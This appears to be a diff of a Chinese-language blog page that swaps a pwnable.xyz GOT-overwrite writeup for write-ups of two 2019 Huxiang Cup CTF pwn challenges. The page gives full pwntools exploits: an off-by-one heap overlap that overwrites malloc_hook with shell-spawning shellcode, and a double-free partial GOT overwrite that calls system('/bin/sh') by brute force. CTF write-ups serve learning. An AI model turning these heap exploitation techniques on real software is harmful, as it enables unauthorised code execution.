@@ -3,38 +3,32 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>pwnable.xyz Note WriteUp - thatshaman&#39;s site</title>
+  <title>湖湘杯2019复赛 pwn Writeup - thatshaman&#39;s site</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="pwnable.xyz 上的Note的WriteUp。">
+  <meta name="description" content="湖湘杯2019复赛pwn题的解题过程">
 <meta name="keywords" content="pwn,ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.xyz Note WriteUp">
-<meta property="og:url" content="http://shiroinu.top/2019/09/12/note/index.html">
+<meta property="og:title" content="湖湘杯2019复赛 pwn Writeup">
+<meta property="og:url" content="http://shiroinu.top/2019/11/09/hxb2019pwn/index.html">
 <meta property="og:site_name" content="thatshaman&#39;s site">
-<meta property="og:description" content="pwnable.xyz 上的Note的WriteUp。">
+<meta property="og:description" content="湖湘杯2019复赛pwn题的解题过程">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png">
-<meta property="og:updated_time" content="2019-09-12T12:32:34.063Z">
+<meta property="og:updated_time" content="2019-11-09T13:54:49.846Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.xyz Note WriteUp">
-<meta name="twitter:description" content="pwnable.xyz 上的Note的WriteUp。">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png">
+<meta name="twitter:title" content="湖湘杯2019复赛 pwn Writeup">
+<meta name="twitter:description" content="湖湘杯2019复赛pwn题的解题过程">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1573356695710">
+  <link rel="stylesheet" href="/css/style.css?v=1573356695769">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -164,51 +158,139 @@
         
             <img src="/images/back1.png">
         
-        <h1>pwnable.xyz Note WriteUp</h1>
+        <h1>湖湘杯2019复赛 pwn Writeup</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>238 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月09日</a>
+    <a><i class="nexmoefont icon-areachart"></i>979 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
     
   </div>
   <article>
-    <p>pwnable.xyz 上的Note的WriteUp。</p>
+    <p>湖湘杯2019复赛pwn题的解题过程</p>
 <a id="more"></a>
-
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png" alt="MarkDown"></p>
-<p><img src="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png" alt="MarkDown"></p>
-<p><img src="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png" alt="MarkDown"></p>
-<p><img src="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png" alt="MarkDown"></p>
-<p>目标是触发win()函数。注意到，输入1进入的<code>edit_note()</code>函数可对全局变量<code>s</code>进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 <code>edit_desc()</code>函数是从标准输入流写入<code>buf</code>内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。</p>
-<p>还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.</p>
-<p><img src="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png" alt="MarkDown"></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+<h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><p>IDA打开发现是静态编译的堆题,没开任何保护,基本操作便是add(),delete(),edit().<br>特点是将malloc得到的指针放在了栈上rsp + 0x20的位置,而size则放在了rsp + 0x20 + 16*8 = rsp + 0xa0的位置,且因为是静态编译,无法使用pwngdb中的heap/fastbins/unsorted等指令,相当于增加了调试难度.</p>
+<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>题目中在edit时,修改新的size是用的strlen()函数,因此当我们将chunk中的内容与next_chunk的size连起来时,size就会被 + 2 因此就可以再次edit()来修改next_chunk的size</p>
+<h3 id="堆重叠来获取main-arena-chunk"><a href="#堆重叠来获取main-arena-chunk" class="headerlink" title="堆重叠来获取main_arena_chunk"></a>堆重叠来获取main_arena_chunk</h3><p>具体过程见EXP</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8
+from pwn import *
+sh = process(&#39;./HackNotenew&#39;)
+#sh = remote(&#39;183.129.189.62&#39;,21004)
+main_arena_88 = 0x00000000006ca858
+main_arena_0x61 = 0x6ca828
+malloc_hook = 0x6CB788
+chunk_ptr = 0x6cbc40
 context.log_level = &#39;DEBUG&#39;
-flag = 0x40093c
-elf = ELF(&#39;./challenge&#39;)
-puts_got = elf.got[&#39;puts&#39;]
-print(hex(puts_got))
-#puts_got = 0x601220
-sh = process(&#39;./challenge&#39;)
-#sh = remote(&#39;svc.pwnable.xyz&#39;,30016)
-sh.recvuntil(&#39;&gt; &#39;)
-payload = &#39;A&#39; * 32 + p64(puts_got)
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)
+def add(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Input the Size:&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Input the Note:&#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;4. Exit&#39;)
+def add_full(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Input the Size:&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Input the Note:&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;4. Exit&#39;)
+def delete(index):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;Input the Index of Note:&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;4. Exit&#39;)</code></pre>
+<pre><code class="python">def edit(index,content):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;Input the Index of Note:&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;Input the Note:&#39;)
+    sh.send(content)
+gdb.attach(sh)
+sh.recvuntil(&#39;4. Exit&#39;)
+add(0x108,&#39;aaaa&#39;) #0 暂时不能使用off_by_one
+add(0x200,&#39;b&#39; * 0x1f0 + p64(0x200) ) #1 0x200是fake_prev_size  
+add(0x100,&#39;cccc&#39;) #2 next_chunk
+add(0x100,&#39;dddd&#39; ) #3
+edit(0,&#39;a&#39; * 0x108) # 这次修改将size改为了0x10a (本来的0x108 + next_chunk的size两字节)
+delete(1) # [2] prev_size = 0x210 size = 0x110
+edit(0,&#39;a&#39; * 0x108 + &#39;\n&#39;) # [1] size = 0x200 off_by_one修改
+add(0xa0,&#39;eeee&#39;) #1 切割原先free的 [1] 被修改的prev_size是一开始add()时写上去的0x200
+add(0x50,&#39;ffff&#39;) #4 
+add(0x40,&#39;gggg&#39;) #5
+# 堆重叠的两个fastbin
+delete(1)
+delete(2) #触发合并 size = 0x321 
+add(0x300,&#39;hhhh&#39;) #1 覆盖[4] [5] 两个fastbin
+delete(4) 
+delete(5)
+edit(1,&#39;\x00&#39; * 0xa8 +  p64(0x60) + p64(0x51) + p64(0) *10 + p64(0x51) + p64(0x6cb820) + &#39;\n&#39;) # [4]-&gt;fd = 0x51 目的是修改main_arena 0x6ca828这个地址的值 [5] -&gt; fd = 0x6cb820 fake_chunk_in_main_arena 的地址
+add(0x50, &#39;aaa&#39;) #4 此时 *0x6ca828 = 0x51
+add(0x40, &#39;bbb&#39;) #5 此时 *0x6ca820 = 0x6ca820
+add(0x40, p64(0) * 5 + p64(malloc_hook - 0x10) ) #malloc()得到0x6ca830 修改 main_arena + 88 即 last_remainder 的值为 malloc_hook -0x10 的地址
+add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) 
+add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) )
+add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前的unsorted bin 还没切割完,优先级比last_remainder高
 sh.sendline(&#39;1&#39;)
-sh.recvuntil(&#39;? &#39;)
-sh.sendline(&#39;52&#39;)
-sh.recvuntil(&#39;note: &#39;)
-sh.sendline(payload)
-sh.recvuntil(&#39;&gt; &#39;)
-sh.sendline(&#39;2&#39;)
-sh.recvuntil(&#39;desc: &#39;)
-sh.sendline(p64(flag))
-sh.recvuntil(&#39;&gt; &#39;)
-sh.sendline(&#39;123&#39;)
+sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)
 sh.interactive()</code></pre>
+<h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+#context.log_level =&#39;DEBUG&#39;
+
+def add(size, content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Name Size:&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Name:&#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;Your choice :&#39;)
+def delete(index):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;The id you want to delete:&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;Your choice :&#39;)
+x = 1
+while (1):
+    log.info(&#39;time =&#39; + str(x))
+    x+=1
+    sh = process(&#39;./NameSystem&#39;)
+    #sh = remote(&#39;183.129.189.62&#39;,15905)
+    sh.recvuntil(&#39;Your choice :&#39;)
+    for i in range(18):
+        add(0x40,&#39;aaa&#39;)
+    #gdb.attach(sh)
+    add(0x50,&#39;bbb&#39;)
+    add(0x50,&#39;ccc&#39;)</code></pre>
+<pre><code class="python">    delete(0)
+    delete(18)
+    delete(17)
+    delete(19)
+    delete(0)
+    delete(0)
+    delete(0)
+    delete(0)
+    add(0x50,p64(0x601ffa))
+    add(0x50,&#39;\x00&#39;)
+    add(0x50,&#39;/bin/sh\x00&#39;)
+    add(0x50,&#39;\x00&#39; * 14 + &#39;\x90\x53&#39;) #最后三位0x390确定 爆破0x005这三位 &#39;\x00&#39;来自于readin()函数的实现会将&#39;\n&#39;替换成&#39;\x00&#39; 
+    try:
+        sh.sendline(&#39;3&#39;)
+        sh.recvuntil(&#39;The id you want to delete:&#39;)
+        sh.sendline(str(15))
+        sleep(0.2)
+        sh.sendline(&#39;ls&#39;)
+        sh.recv()
+        sh.sendline(&#39;ls&#39;)
+    except EOFError:
+        sh.close()
+        continue
+    else:
+        sh.interactive()</code></pre>
 
   </article>
   <section class="nexmoe-comment">
